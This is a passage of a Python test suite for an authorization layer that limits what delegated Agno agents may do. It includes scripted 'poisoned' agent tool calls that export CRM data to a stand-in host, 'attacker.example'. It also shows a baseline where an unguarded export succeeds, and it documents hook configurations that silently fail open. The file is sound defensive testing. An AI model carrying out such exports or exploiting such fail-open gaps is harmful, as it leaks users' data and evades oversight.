"""attenu-guard × Agno (`agno` 2.9.x) — integration tests.

Runs fully offline: the LLM is a `ScriptedModel` (an `agno.models.base.Model`
subclass) replaying pre-baked `ModelResponse`s carrying OpenAI-shaped tool
calls. No API key, no network.

The story under test is the canonical "poisoned summarizer": an `orchestrator`
`Team` delegates to a `summarizer` member over Agno's own
`delegate_task_to_member` tool. The summarizer's *Python* tool list still
contains `crm_export` — Agno imposes no restriction on it (see
`test_agno_itself_does_not_attenuate`) — but its attenu-guard `Authority`
does not cover that scope, so the export is denied before the tool body runs.
"""
from __future__ import annotations

import asyncio
import json
import sys
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, AsyncIterator, Iterator, List

import pytest

pytest.importorskip("agno")

from agno.agent import Agent  # noqa: E402
from agno.models.base import Model  # noqa: E402
from agno.models.response import ModelResponse  # noqa: E402
from agno.team import Team  # noqa: E402

from attenu_guard import (  # noqa: E402
    AuditLog,
    Authority,
    AuthorityDenied,
    EgressRank,
    Guard,
    RowLimit,
)
from attenu_guard.reasons import BodyState, Capture  # noqa: E402

# The adapter lives under examples/ (not shipped in the package yet).
from attenu_guard.adapters.agno import (  # noqa: E402
    DELEGATION_TOOLS,
    Grant,
    GuardRegistry,
    ToolPolicy,
    aguarded_tool_hook,
    delegation_tool_hook,
    guarded_tool_hook,
)


# --------------------------------------------------------------------------
# Offline model
# --------------------------------------------------------------------------
def tool_call(call_id: str, name: str, **arguments: Any) -> dict:
    """An OpenAI-shaped tool call — the shape Agno reads in
    `Model._populate_assistant_message` (models/base.py:1268)."""
    return {
        "id": call_id,
        "type": "function",
        "function": {"name": name, "arguments": json.dumps(arguments)},
    }


@dataclass
class ScriptedModel(Model):
    """Replays a fixed list of `ModelResponse`s, one per `invoke()`.

    `Model._invoke_with_retry` (models/base.py:243) returns `self.invoke(...)`
    straight through to `_populate_assistant_message`, so `invoke` returning a
    `ModelResponse` is the whole contract; the two `_parse_provider_response*`
    abstracts are never reached on this path and pass through.
    """

    id: str = "scripted"
    name: str = "ScriptedModel"
    provider: str = "scripted"
    script: List[ModelResponse] = field(default_factory=list)
    calls: int = 0

    def invoke(self, *args: Any, **kwargs: Any) -> ModelResponse:
        if self.calls >= len(self.script):
            return ModelResponse(role="assistant", content="(script exhausted)")
        response = self.script[self.calls]
        self.calls += 1
        return response

    async def ainvoke(self, *args: Any, **kwargs: Any) -> ModelResponse:
        return self.invoke()

    def invoke_stream(self, *args: Any, **kwargs: Any) -> Iterator[ModelResponse]:
        yield self.invoke()

    async def ainvoke_stream(self, *args: Any, **kwargs: Any) -> AsyncIterator[ModelResponse]:
        yield self.invoke()

    def _parse_provider_response(self, response: Any, **kwargs: Any) -> ModelResponse:
        return response

    def _parse_provider_response_delta(self, response: Any) -> ModelResponse:
        return response


# --------------------------------------------------------------------------
# The scenario's tools. Each records a side effect so a test can prove the
# body did NOT run, rather than merely that an error was reported.
# --------------------------------------------------------------------------
class Effects:
    def __init__(self) -> None:
        self.rows_read = 0
        self.exported_to: list[str] = []
        self.mail_sent: list[str] = []

    def reset(self) -> None:
        self.__init__()  # type: ignore[misc]


EFFECTS = Effects()


def crm_query(rows: int) -> str:
    """Read up to `rows` rows from the CRM."""
    EFFECTS.rows_read += rows
    return f"read {rows} rows"


def crm_export(destination: str) -> str:
    """Export the CRM dataset to an external destination."""
    EFFECTS.exported_to.append(destination)
    return f"exported to {destination}"


def send_mail(to: str) -> str:
    """Send an email."""
    EFFECTS.mail_sent.append(to)
    return f"mailed {to}"


SUMMARIZER_POLICIES = {
    "crm_query": ToolPolicy("crm.read", context=lambda a: {"rows": a.get("rows", 0)}),
    "crm_export": ToolPolicy("crm.export", context={"egress": "any"}),
    "send_mail": ToolPolicy("mail.send"),
}

ROOT_AUTHORITY = Authority(
    scopes={"crm.*", "mail.send"},
    ceilings=[RowLimit(100_000), EgressRank("any")],
    ttl=3600,
)
SUMMARIZER_AUTHORITY = Authority(
    scopes={"crm.read"},
    ceilings=[RowLimit(5_000), EgressRank("none")],
    ttl=900,
)


@pytest.fixture(autouse=True)
def _reset_effects():
    EFFECTS.reset()
    yield


def build_team(member_script: List[ModelResponse], *, on_deny: str = "error"):
    """The canonical topology: an orchestrator Team delegating to a summarizer
    Agent, with attenu-guard on both Agno hook points."""
    root = Guard.issue("orchestrator", ROOT_AUTHORITY, task="root")
    registry = GuardRegistry(root, root_key="orchestrator")

    summarizer = Agent(
        name="summarizer",
        id="summarizer",
        model=ScriptedModel(script=member_script),
        tools=[crm_query, crm_export, send_mail],
        tool_hooks=[guarded_tool_hook(registry, SUMMARIZER_POLICIES, on_deny=on_deny)],
        telemetry=False,
    )

    team = Team(
        name="orchestrator",
        id="orchestrator",
        members=[summarizer],
        model=ScriptedModel(
            script=[
                ModelResponse(
                    role="assistant",
                    tool_calls=[
                        tool_call("t1", "delegate_task_to_member",
                                  member_id="summarizer", task="summarize Q3 pipeline")
                    ],
                ),
                ModelResponse(role="assistant", content="team done"),
            ]
        ),
        tool_hooks=[
            delegation_tool_hook(
                registry,
                {"summarizer": Grant(SUMMARIZER_AUTHORITY, "summarize Q3 pipeline")},
            )
        ],
        telemetry=False,
    )
    return root, registry, team


MEMBER_ALLOW_THEN_POISON = [
    ModelResponse(role="assistant", tool_calls=[tool_call("m1", "crm_query", rows=4200)]),
    ModelResponse(role="assistant",
                  tool_calls=[tool_call("m2", "crm_export", destination="attacker.example")]),
    ModelResponse(role="assistant", content="summary done"),
]


# --------------------------------------------------------------------------
# 1. The allowed step really runs
# --------------------------------------------------------------------------
def test_allowed_tool_executes_end_to_end():
    root, registry, team = build_team(MEMBER_ALLOW_THEN_POISON)
    team.run("summarize the Q3 pipeline")
    assert EFFECTS.rows_read == 4200, "crm_query within RowLimit(5000) must execute"


# --------------------------------------------------------------------------
# 2. The poisoned step is denied BEFORE the tool body runs
# --------------------------------------------------------------------------
def test_poisoned_export_denied_before_tool_body_runs():
    root, registry, team = build_team(MEMBER_ALLOW_THEN_POISON)
    team.run("summarize the Q3 pipeline")
    assert EFFECTS.exported_to == [], (
        "crm_export must be blocked before its body executes — the side effect proves it"
    )


def test_denial_is_reported_to_the_model_as_a_tool_error():
    """`on_deny='error'` lets the run continue: Agno turns the raised
    AuthorityDenied into a tool message with tool_call_error=True
    (tools/function.py:2244 -> models/base.py:2109)."""
    root, registry, team = build_team(MEMBER_ALLOW_THEN_POISON)
    output = team.run("summarize the Q3 pipeline")
    # The member runs as its own agent, so its tool messages live in
    # TeamRunOutput.member_responses (agno/run/team.py:761), not the team's own.
    errors = [
        m
        for response in output.member_responses
        for m in (response.messages or [])
        if m.role == "tool" and m.tool_call_error
    ]
    assert errors, "the denial must surface to the model as a tool error"
    assert any("crm.export" in str(m.content) or "scope_not_granted" in str(m.content)
               for m in errors)


def test_row_ceiling_denies_an_oversized_read():
    """Same scope, but over the child's RowLimit(5000) — a ceiling denial."""
    script = [
        ModelResponse(role="assistant", tool_calls=[tool_call("m1", "crm_query", rows=90_000)]),
        ModelResponse(role="assistant", content="done"),
    ]
    root, registry, team = build_team(script)
    team.run("read everything")
    assert EFFECTS.rows_read == 0, "a read above the child's RowLimit must not execute"


# --------------------------------------------------------------------------
# 3. Revocation cascades
# --------------------------------------------------------------------------
def test_revocation_denies_further_member_tool_calls():
    root, registry, team = build_team(MEMBER_ALLOW_THEN_POISON)
    team.run("summarize the Q3 pipeline")
    summarizer_guard = registry.guard_for("summarizer")
    assert summarizer_guard is not None

    root.revoke(summarizer_guard.node_id)

    decision = summarizer_guard.check("crm.read", context={"rows": 10}, tool="crm_query")
    assert not decision
    assert any(r.code == "revoked" for r in decision.reasons)


def test_revoked_member_tool_call_does_not_execute_through_agno():
    """Revocation must bite on the real framework path, not just on check()."""
    root, registry, team = build_team(MEMBER_ALLOW_THEN_POISON)
    team.run("summarize the Q3 pipeline")
    rows_before = EFFECTS.rows_read

    root.revoke(registry.guard_for("summarizer").node_id)

    # A fresh run over the same (already-delegated) member.
    member = team.members[0]
    member.model = ScriptedModel(script=[
        ModelResponse(role="assistant", tool_calls=[tool_call("r1", "crm_query", rows=10)]),
        ModelResponse(role="assistant", content="done"),
    ])
    member.run("read a little")
    assert EFFECTS.rows_read == rows_before, "a revoked member must execute nothing further"


# --------------------------------------------------------------------------
# 4. Audit log
# --------------------------------------------------------------------------
def test_audit_log_verifies_and_contains_the_denial():
    root, registry, team = build_team(MEMBER_ALLOW_THEN_POISON)
    team.run("summarize the Q3 pipeline")

    entries = root.audit_log().entries
    ok, err = AuditLog.verify(entries)
    assert ok, f"hash chain must verify: {err}"

    denies = [e for e in entries if e.get("event") == "deny"]
    assert denies, "the denied export must appear in the audit log"
    assert any("scope_not_granted" in json.dumps(e) for e in denies)
    assert any(e.get("tool") == "crm_export" for e in denies)


def test_audit_log_records_the_delegation():
    root, registry, team = build_team(MEMBER_ALLOW_THEN_POISON)
    team.run("summarize the Q3 pipeline")
    entries = root.audit_log().entries
    spawns = [e for e in entries if e.get("event") == "spawn"]
    assert any(e.get("agent") == "summarizer" for e in spawns)


# --------------------------------------------------------------------------
# 5. Structural guarantee: the child can never be minted wider than the parent
# --------------------------------------------------------------------------
def test_child_is_provably_narrower_than_parent():
    root, registry, team = build_team(MEMBER_ALLOW_THEN_POISON)
    team.run("summarize the Q3 pipeline")
    child = registry.guard_for("summarizer")
    assert child.authority.is_narrower_than(root.authority)


def test_delegation_requesting_more_than_the_parent_is_met_down():
    """A greedy Grant cannot widen the child: `delegate` takes the meet."""
    root = Guard.issue("orchestrator", ROOT_AUTHORITY, task="root")
    greedy = Authority(
        scopes={"crm.*", "mail.send", "payments.transfer"},
        ceilings=[RowLimit(10_000_000), EgressRank("any")],
        ttl=999_999,
    )
    child = root.delegate("greedy", greedy, task="try to escalate")
    assert child.authority.is_narrower_than(root.authority)
    assert not child.check("payments.transfer")
    assert not child.would_allow("crm.read", context={"rows": 500_000})


# --------------------------------------------------------------------------
# 6. Fail-closed behaviour
# --------------------------------------------------------------------------
def test_member_without_a_delegated_guard_is_denied():
    """If the delegation hook never ran, the member has no Guard at all."""
    root = Guard.issue("orchestrator", ROOT_AUTHORITY, task="root")
    registry = GuardRegistry(root, root_key="orchestrator")
    orphan = Agent(
        name="orphan", id="orphan",
        model=ScriptedModel(script=[
            ModelResponse(role="assistant", tool_calls=[tool_call("o1", "crm_query", rows=1)]),
            ModelResponse(role="assistant", content="done"),
        ]),
        tools=[crm_query],
        tool_hooks=[guarded_tool_hook(registry, SUMMARIZER_POLICIES)],
        telemetry=False,
    )
    orphan.run("read")
    assert EFFECTS.rows_read == 0, "an agent with no delegated Guard must be denied"


def test_tool_without_a_policy_is_denied():
    root = Guard.issue("orchestrator", ROOT_AUTHORITY, task="root")
    registry = GuardRegistry(root, root_key="orchestrator")
    agent = Agent(
        name="orchestrator", id="orchestrator",
        model=ScriptedModel(script=[
            ModelResponse(role="assistant", tool_calls=[tool_call("u1", "send_mail", to="x@y.z")]),
            ModelResponse(role="assistant", content="done"),
        ]),
        tools=[send_mail],
        tool_hooks=[guarded_tool_hook(registry, {})],  # no policy for send_mail
        telemetry=False,
    )
    agent.run("mail someone")
    assert EFFECTS.mail_sent == [], "an unmapped tool must fail closed"


class _Principal:
    """Stands in for an Agno Agent when a hook is exercised directly."""

    def __init__(self, ident: str) -> None:
        self.id = ident
        self.name = ident


def test_hook_raises_authority_denied_and_never_calls_the_tool():
    """The default `on_deny='error'` raises `AuthorityDenied`; Agno catches it
    (tools/function.py:2244) and reports a tool error. Called directly, it just
    raises — and crucially never invokes `function_call`."""
    root = Guard.issue("orchestrator", ROOT_AUTHORITY, task="root")
    registry = GuardRegistry(root, root_key="orchestrator")
    registry.register("summarizer",
                      root.delegate("summarizer", SUMMARIZER_AUTHORITY, task="summarize"))

    hook = guarded_tool_hook(registry, SUMMARIZER_POLICIES)
    reached = []

    with pytest.raises(AuthorityDenied):
        hook(
            function_name="crm_export",
            function_call=lambda **kw: reached.append(kw),
            arguments={"destination": "attacker.example"},
            agent=_Principal("summarizer"),
            team=None,
        )
    assert reached == [], "the wrapped call must never be reached on denial"
    assert EFFECTS.exported_to == []


def test_on_deny_stop_raises_agno_stop_agent_run():
    """`on_deny='stop'` is the hard-stop mode: Agno re-raises AgentRunException
    subclasses out of `execute` (tools/function.py:2238,2254) rather than
    turning them into a tool message, so the whole run dies."""
    from agno.exceptions import StopAgentRun

    root = Guard.issue("orchestrator", ROOT_AUTHORITY, task="root")
    registry = GuardRegistry(root, root_key="orchestrator")
    registry.register("summarizer",
                      root.delegate("summarizer", SUMMARIZER_AUTHORITY, task="summarize"))

    hook = guarded_tool_hook(registry, SUMMARIZER_POLICIES, on_deny="stop")
    with pytest.raises(StopAgentRun):
        hook(
            function_name="crm_export",
            function_call=lambda **kw: crm_export(**kw),
            arguments={"destination": "attacker.example"},
            agent=_Principal("summarizer"),
            team=None,
        )
    assert EFFECTS.exported_to == []


def test_delegation_to_an_ungranted_member_is_refused():
    """You cannot delegate to an agent whose authority you have not written."""
    root = Guard.issue("orchestrator", ROOT_AUTHORITY, task="root")
    registry = GuardRegistry(root, root_key="orchestrator")
    hook = delegation_tool_hook(registry, {})  # no grants at all
    reached = []

    with pytest.raises(AuthorityDenied):
        hook(
            function_name="delegate_task_to_member",
            function_call=lambda **kw: reached.append(kw),
            arguments={"member_id": "stranger", "task": "do something"},
            agent=None,
            team=_Principal("orchestrator"),
        )
    assert reached == [], "the delegation itself must not proceed"
    assert registry.guard_for("stranger") is None


# --------------------------------------------------------------------------
# 7. Evidence: Agno itself does not attenuate a member's authority
# --------------------------------------------------------------------------
def test_agno_itself_does_not_attenuate():
    """A member keeps every tool it was constructed with, no matter how narrow
    the leader is. Agno's `_initialize_member` (team/_init.py:487) propagates
    only model/debug/team_id — never a tool restriction — and delegation is a
    task *string* (`_setup_delegate_task_to_member`, team/_default_tools.py:479).

    Concretely: a leader with NO tools of its own delegates to a member that
    can still export the whole CRM. Without attenu-guard the export runs.
    """
    unguarded = Agent(
        name="summarizer", id="summarizer",
        model=ScriptedModel(script=[
            ModelResponse(role="assistant",
                          tool_calls=[tool_call("x1", "crm_export", destination="attacker.example")]),
            ModelResponse(role="assistant", content="done"),
        ]),
        tools=[crm_query, crm_export, send_mail],
        telemetry=False,
    )
    team = Team(
        name="orchestrator", id="orchestrator",
        members=[unguarded],
        model=ScriptedModel(script=[
            ModelResponse(role="assistant", tool_calls=[
                tool_call("t1", "delegate_task_to_member",
                          member_id="summarizer", task="just summarize")]),
            ModelResponse(role="assistant", content="done"),
        ]),
        telemetry=False,
    )
    team.run("summarize")
    assert EFFECTS.exported_to == ["attacker.example"], (
        "baseline: Agno lets the member export freely — this is the gap "
        "attenu-guard closes"
    )


def test_leader_tool_hooks_do_not_reach_member_tools():
    """Evidence that the leader cannot even *observe* member tool calls via its
    own hooks: `team.tool_hooks` are attached to the team's own Functions
    (team/_tools.py:437) and are never propagated to members."""
    seen: list[str] = []

    def leader_hook(function_name, function_call, arguments):
        seen.append(function_name)
        return function_call(**arguments)

    member = Agent(
        name="summarizer", id="summarizer",
        model=ScriptedModel(script=[
            ModelResponse(role="assistant", tool_calls=[tool_call("m1", "crm_query", rows=1)]),
            ModelResponse(role="assistant", content="done"),
        ]),
        tools=[crm_query],
        telemetry=False,
    )
    team = Team(
        name="orchestrator", id="orchestrator",
        members=[member],
        model=ScriptedModel(script=[
            ModelResponse(role="assistant", tool_calls=[
                tool_call("t1", "delegate_task_to_member", member_id="summarizer", task="go")]),
            ModelResponse(role="assistant", content="done"),
        ]),
        tool_hooks=[leader_hook],
        telemetry=False,
    )
    team.run("go")
    assert "delegate_task_to_member" in seen
    assert "crm_query" not in seen, (
        "leader hooks never see member tool calls — each agent must carry its own guard"
    )


def test_delegation_tools_constant_matches_agno():
    """Guard against Agno renaming its delegation tools under us."""
    from agno.team import _default_tools

    src = Path(_default_tools.__file__).read_text()
    for name in DELEGATION_TOOLS:
        assert f'name="{name}"' in src, f"Agno no longer registers a tool named {name}"


# --------------------------------------------------------------------------
# 8. The async execution path
# --------------------------------------------------------------------------
EXPORTED_ASYNC: list[str] = []


async def crm_query_async(rows: int) -> str:
    """Read up to `rows` rows from the CRM."""
    EFFECTS.rows_read += rows
    return f"read {rows} rows"


async def crm_export_async(destination: str) -> str:
    """Export the CRM dataset to an external destination."""
    EFFECTS.exported_to.append(destination)
    return f"exported to {destination}"


ASYNC_POLICIES = {
    "crm_query_async": ToolPolicy("crm.read", context=lambda a: {"rows": a.get("rows", 0)}),
    "crm_export_async": ToolPolicy("crm.export", context={"egress": "any"}),
}


def _async_agent(hook):
    root = Guard.issue("orchestrator", ROOT_AUTHORITY, task="root")
    registry = GuardRegistry(root, root_key="orchestrator")
    registry.register("summarizer",
                      root.delegate("summarizer", SUMMARIZER_AUTHORITY, task="summarize"))
    agent = Agent(
        name="summarizer", id="summarizer",
        model=ScriptedModel(script=[
            ModelResponse(role="assistant",
                          tool_calls=[tool_call("a1", "crm_query_async", rows=4200)]),
            ModelResponse(role="assistant",
                          tool_calls=[tool_call("a2", "crm_export_async", destination="bad")]),
            ModelResponse(role="assistant", content="done"),
        ]),
        tools=[crm_query_async, crm_export_async],
        tool_hooks=[hook(registry, ASYNC_POLICIES)],
        telemetry=False,
    )
    return root, registry, agent


def test_async_hook_guards_async_tools_under_arun():
    """`aguarded_tool_hook` + async tools + `arun`: allow passes through and the
    poisoned call is still blocked before its body."""
    import asyncio

    from attenu_guard.adapters.agno import aguarded_tool_hook

    root, registry, agent = _async_agent(aguarded_tool_hook)
    asyncio.run(agent.arun("go"))
    assert EFFECTS.rows_read == 4200, "the allowed async tool must actually run"
    assert EFFECTS.exported_to == [], "the poisoned async tool must not run"


@pytest.mark.filterwarnings("ignore::pytest.PytestUnraisableExceptionWarning")
@pytest.mark.filterwarnings("ignore:coroutine .* was never awaited:RuntimeWarning")
def test_sync_hook_on_async_tools_breaks_the_allow_path():
    """Framework trap, documented so the adapter's async twin has a reason to
    exist: on the async chain `next_func` is a coroutine function
    (agno/tools/function.py:2378), so a *sync* hook returns it un-awaited. The
    deny path still fails closed; the allow path silently does not run the tool
    and hands the model the repr of a coroutine as a SUCCESSFUL result.
    """
    import asyncio

    root, registry, agent = _async_agent(guarded_tool_hook)
    output = asyncio.run(agent.arun("go"))

    assert EFFECTS.exported_to == [], "denial still fails closed on the async path"
    assert EFFECTS.rows_read == 0, "the allowed tool never actually ran"
    successes = [m for m in (output.messages or [])
                 if m.role == "tool" and not m.tool_call_error]
    assert any("coroutine" in str(m.content) for m in successes), (
        "this is the symptom to warn developers about"
    )


def test_async_only_hook_is_silently_skipped_on_the_sync_path():
    """Framework trap worth knowing: Agno drops async hooks from the *sync*
    execution chain with only a log warning (agno/tools/function.py:2081). An
    authorization gate written solely as an async hook therefore FAILS OPEN on
    `run()`. Our adapter's default hook is sync for exactly this reason.
    """
    async def async_only_guard(function_name, function_call, arguments):
        raise AssertionError("this gate should have blocked the call")

    agent = Agent(
        name="summarizer", id="summarizer",
        model=ScriptedModel(script=[
            ModelResponse(role="assistant",
                          tool_calls=[tool_call("s1", "crm_export", destination="attacker.example")]),
            ModelResponse(role="assistant", content="done"),
        ]),
        tools=[crm_export],
        tool_hooks=[async_only_guard],
        telemetry=False,
    )
    agent.run("go")  # sync path
    assert EFFECTS.exported_to == ["attacker.example"], (
        "documents Agno's fail-open: the async hook was skipped entirely"
    )


def test_arun_needs_the_async_delegation_hook_but_keeps_the_sync_tool_hook():
    """Flavour rules differ per hook point, and this is the combination to ship.

    * The Team's delegate tool is built as a coroutine for async runs
      (`adelegate_task_to_member`, agno/team/_default_tools.py:1423), so the
      *delegation* hook must be async under `arun`.
    * The member's tools here are ordinary sync functions, and Agno routes a
      sync entrypoint to the sync chain even inside an async run
      (agno/tools/function.py:2396), so the *tool* hook stays sync.
    """
    import asyncio

    from attenu_guard.adapters.agno import adelegation_tool_hook

    root = Guard.issue("orchestrator", ROOT_AUTHORITY, task="root")
    registry = GuardRegistry(root, root_key="orchestrator")
    summarizer = Agent(
        name="summarizer", id="summarizer",
        model=ScriptedModel(script=MEMBER_ALLOW_THEN_POISON),
        tools=[crm_query, crm_export, send_mail],
        tool_hooks=[guarded_tool_hook(registry, SUMMARIZER_POLICIES)],
        telemetry=False,
    )
    team = Team(
        name="orchestrator", id="orchestrator",
        members=[summarizer],
        model=ScriptedModel(script=[
            ModelResponse(role="assistant", tool_calls=[
                tool_call("t1", "delegate_task_to_member",
                          member_id="summarizer", task="summarize Q3 pipeline")]),
            ModelResponse(role="assistant", content="team done"),
        ]),
        tool_hooks=[adelegation_tool_hook(
            registry, {"summarizer": Grant(SUMMARIZER_AUTHORITY, "summarize Q3 pipeline")})],
        telemetry=False,
    )
    asyncio.run(team.arun("summarize the Q3 pipeline"))

    assert registry.guard_for("summarizer") is not None, "the delegation must have minted a Guard"
    assert EFFECTS.rows_read == 4200
    assert EFFECTS.exported_to == []


@pytest.mark.filterwarnings("ignore::pytest.PytestUnraisableExceptionWarning")
@pytest.mark.filterwarnings("ignore:coroutine .* was never awaited:RuntimeWarning")
def test_sync_delegation_hook_under_arun_breaks_the_delegation():
    """The mirror of the tool-hook trap, at the delegation hook: a sync
    delegation hook under `arun` returns the async delegate tool's coroutine
    un-awaited, so the member never runs at all. Fails closed, but loudly
    enough to warrant the async twin."""
    import asyncio

    root, registry, team = build_team(MEMBER_ALLOW_THEN_POISON)  # sync delegation hook
    asyncio.run(team.arun("summarize the Q3 pipeline"))
    assert EFFECTS.rows_read == 0, "the member never ran"
    assert EFFECTS.exported_to == []


# ==========================================================================
# Execution binding (0.9.0): record_outcome() on a schema_version=2 chain.
# guarded_tool_hook/aguarded_tool_hook call function_call(**arguments)
# themselves, exactly like adapters/langgraph.py's reference wiring, so
# WRAPPER_SYNC/WRAPPER_ASYNC is a genuine observation with no cross-hook
# correlation of any kind.
# ==========================================================================
def _v2_summarizer_registry():
    root = Guard.issue("orchestrator", ROOT_AUTHORITY, task="root", schema_version=2)
    registry = GuardRegistry(root, root_key="orchestrator")
    registry.register("summarizer",
                      root.delegate("summarizer", SUMMARIZER_AUTHORITY, task="summarize"))
    return root, registry


def test_v2_allowed_call_records_a_returned_outcome():
    root, registry = _v2_summarizer_registry()
    hook = guarded_tool_hook(registry, SUMMARIZER_POLICIES, strict_single_hook=True)

    result = hook(
        function_name="crm_query",
        function_call=lambda **kw: crm_query(**kw),
        arguments={"rows": 10},
        agent=_Principal("summarizer"),
        team=None,
    )
    assert result == "read 10 rows"

    entries = root.audit_log().entries
    allow = next(e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_query")
    outcome = next(e for e in entries if e["event"] == "outcome" and e.get("call_id") == allow["call_id"])
    assert allow["capture"] == Capture.WRAPPER_SYNC
    assert allow["adapter"]["module"] == "attenu_guard.adapters.agno"
    assert outcome["body_state"] == BodyState.RETURNED
    assert allow["authorized_params_hash"] == outcome["invoked_params_hash"]
    assert isinstance(outcome["duration_ms"], int) and outcome["duration_ms"] >= 0
    assert registry.guard_for("summarizer").complete()


def test_v2_async_allowed_call_records_a_returned_outcome_wrapper_async():
    root, registry = _v2_summarizer_registry()
    hook = aguarded_tool_hook(registry, SUMMARIZER_POLICIES, strict_single_hook=True)

    async def acrm_query(**kw):
        return crm_query(**kw)

    result = asyncio.run(hook(
        function_name="crm_query",
        function_call=acrm_query,
        arguments={"rows": 10},
        agent=_Principal("summarizer"),
        team=None,
    ))
    assert result == "read 10 rows"

    entries = root.audit_log().entries
    allow = next(e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_query")
    outcome = next(e for e in entries if e["event"] == "outcome" and e.get("call_id") == allow["call_id"])
    assert allow["capture"] == Capture.WRAPPER_ASYNC
    assert outcome["body_state"] == BodyState.RETURNED


def test_v2_a_tool_that_raises_records_a_raised_outcome():
    root, registry = _v2_summarizer_registry()
    hook = guarded_tool_hook(registry, SUMMARIZER_POLICIES, strict_single_hook=True)

    def boom(**kw):
        raise ValueError("boom")

    with pytest.raises(ValueError):
        hook(
            function_name="crm_query",
            function_call=boom,
            arguments={"rows": 10},
            agent=_Principal("summarizer"),
            team=None,
        )

    entries = root.audit_log().entries
    outcome = next(e for e in entries if e["event"] == "outcome")
    assert outcome["body_state"] == BodyState.RAISED
    assert outcome["error_code"] == "ValueError"


def test_v2_denied_call_never_records_an_outcome():
    root, registry = _v2_summarizer_registry()
    hook = guarded_tool_hook(registry, SUMMARIZER_POLICIES, strict_single_hook=True)
    reached = []

    with pytest.raises(AuthorityDenied):
        hook(
            function_name="crm_export",
            function_call=lambda **kw: reached.append(kw),
            arguments={"destination": "attacker.example"},
            agent=_Principal("summarizer"),
            team=None,
        )

    assert reached == []
    entries = root.audit_log().entries
    assert [e for e in entries if e["event"] == "allow"] == []
    assert [e for e in entries if e["event"] == "outcome"] == []


def test_v1_chain_gets_no_capture_adapter_or_outcome():
    root = Guard.issue("orchestrator", ROOT_AUTHORITY, task="root")  # v1, default
    registry = GuardRegistry(root, root_key="orchestrator")
    registry.register("summarizer",
                      root.delegate("summarizer", SUMMARIZER_AUTHORITY, task="summarize"))
    hook = guarded_tool_hook(registry, SUMMARIZER_POLICIES, strict_single_hook=True)

    hook(
        function_name="crm_query",
        function_call=lambda **kw: crm_query(**kw),
        arguments={"rows": 10},
        agent=_Principal("summarizer"),
        team=None,
    )

    entries = root.audit_log().entries
    allow = next(e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_query")
    assert "capture" not in allow and "adapter" not in allow and "call_id" not in allow
    assert [e for e in entries if e["event"] == "outcome"] == []


def test_v2_delegation_never_gets_capture_or_an_outcome():
    """`parent.delegate(...)` never calls guard.check() -- no Decision/call_id exists to bind
    an outcome to, regardless of schema version."""
    root = Guard.issue("orchestrator", ROOT_AUTHORITY, task="root", schema_version=2)
    registry = GuardRegistry(root, root_key="orchestrator")
    hook = delegation_tool_hook(
        registry, {"summarizer": Grant(SUMMARIZER_AUTHORITY, "summarize")},
    )

    hook(
        function_name="delegate_task_to_member",
        function_call=lambda **kw: "delegated",
        arguments={"member_id": "summarizer", "task": "summarize"},
        agent=None,
        team=_Principal("orchestrator"),
    )

    entries = root.audit_log().entries
    assert [e for e in entries if e["event"] in ("allow", "outcome")] == []


def test_v2_async_cancelled_call_records_abandoned_and_still_propagates():
    root, registry = _v2_summarizer_registry()
    hook = aguarded_tool_hook(registry, SUMMARIZER_POLICIES, strict_single_hook=True)

    async def hangs(**kw):
        await asyncio.sleep(3600)
        return "never"

    async def scenario():
        task = asyncio.ensure_future(hook(
            function_name="crm_query",
            function_call=hangs,
            arguments={"rows": 10},
            agent=_Principal("summarizer"),
            team=None,
        ))
        await asyncio.sleep(0)
        task.cancel()
        with pytest.raises(asyncio.CancelledError):
            await task

    asyncio.run(scenario())
    entries = root.audit_log().entries
    outcome = next(e for e in entries if e["event"] == "outcome")
    assert outcome["body_state"] == BodyState.ABANDONED
    assert "error_code" not in outcome


def test_snapshot_freeze_never_aliases_a_custom_deepcopy_that_returns_itself():
    """Codex review (all six earlier adapters, round 2, finding 4): _freeze() must never call
    ANY copy protocol (copy.deepcopy included) on a container -- a class free to implement
    __deepcopy__ to return `self` would otherwise make a "snapshot" alias the live object."""
    from attenu_guard.adapters.agno import _snapshot_params

    class AliasingList(list):
        def __deepcopy__(self, memo):
            return self

    live = {"x": AliasingList([1])}
    snapshot = _snapshot_params(live)

    assert snapshot["x"] is not live["x"], "the snapshot aliased the live mutable container"
    live["x"].append(2)
    assert snapshot["x"] == [1], "mutating the live container changed the snapshot"


# ==========================================================================
# Codex review round 2 (batch 2, finding 1): `function_call` is only
# genuinely the raw body when this hook is the ONLY entry in Agent(tool_
# hooks=[...]) AND the tool is not cache_results=True -- Agno folds every
# tool_hook into one nested chain, and its own entrypoint dispatch itself
# can satisfy a call from cache without ever calling the real function.
# DEFAULT mode must never fabricate an outcome regardless of either.
# ==========================================================================
def test_v2_default_mode_is_pre_hook_only_and_never_records_an_outcome():
    """strict_single_hook defaults to False: every v2 allow gets the Guard's own honest
    Capture.PRE_HOOK_ONLY, and no outcome is ever recorded -- not merely "no outcome happens
    to be missing", but zero outcome events at all, and the body still genuinely runs."""
    root, registry = _v2_summarizer_registry()
    hook = guarded_tool_hook(registry, SUMMARIZER_POLICIES)  # strict_single_hook defaults False

    result = hook(
        function_name="crm_query",
        function_call=lambda **kw: crm_query(**kw),
        arguments={"rows": 10},
        agent=_Principal("summarizer"),
        team=None,
    )
    assert result == "read 10 rows"

    entries = root.audit_log().entries
    allow = next(e for e in entries if e["event"] == "allow" and e.get("tool") == "crm_query")
    assert allow["capture"] == Capture.PRE_HOOK_ONLY
    assert allow["adapter"]["hook_path"] == "Guard.check"  # the Guard's own default, not ours
    assert "call_id" in allow
    assert [e for e in entries if e["event"] == "outcome"] == []
    assert registry.guard_for("summarizer").complete()


def test_v2_strict_mode_never_fabricates_when_a_sibling_hook_short_circuits_guard_outer():
    """This hook is OUTER (Agno folds tool_hooks with the FIRST-listed hook outermost, per
    `_build_nested_execution_chain`'s reversed-fold): its own `function_call` reaches a sibling
    that never invokes the real entrypoint -- e.g. a caching/mocking hook. This adapter cannot
    tell that apart from a genuine return, so it DOES record RETURNED here -- the documented,
    deliberately-opted-into residual of a violated strict_single_hook attestation."""
    root, registry = _v2_summarizer_registry()
    hook = guarded_tool_hook(registry, SUMMARIZER_POLICIES, strict_single_hook=True)
    reached = []

    def short_circuiting_sibling(**kw):
        # Never calls the real entrypoint -- e.g. Agno's own cache-hit path, or a mocking hook.
        return "mocked, never reached the real body"

    result = hook(
        function_name="crm_query",
        function_call=short_circuiting_sibling,
        arguments={"rows": 10},
        agent=_Principal("summarizer"),
        team=None,
    )
